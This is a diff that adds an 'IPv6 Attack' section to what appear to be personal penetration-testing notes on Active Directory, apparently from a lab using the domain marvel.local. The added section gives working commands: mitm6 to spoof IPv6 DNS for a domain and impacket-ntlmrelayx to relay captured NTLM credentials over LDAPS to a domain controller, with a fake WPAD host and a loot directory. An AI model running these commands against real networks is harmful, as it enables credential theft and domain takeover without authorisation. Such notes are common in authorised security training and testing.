@@ -99,3 +99,22 @@ Mitigation Strategies:
 - Local admin restriction
 ```
 
+
+#### IPv6 Attack :
+```bash
+#In IPv6 attack we can make attacker machine as DNS server for Ipv6 traffic as there nobody doing dns for ipv6 traffic
+
+#Any victum machine in domain should be reboot or just poweron or somebody login in doamin in order to this attack work.
+
+#capture NTLM credentials using with help of spoofed DNS. relay this to Domain controller.
+
+#it is okey the relay user credentials is simply domain user. 
+
+#make fake dns server:
+sudo mitm6 -d <domain name>
+
+#uses ldaps service to relay the ntlm hash  and athenticate to domain controller.
+impacket-ntlmrelayx -6 -t ldaps://192.168.154.134 -wh fakewpad.marvel.local -l lootme
+
+#wait somebody to login or reboot machine.
+```
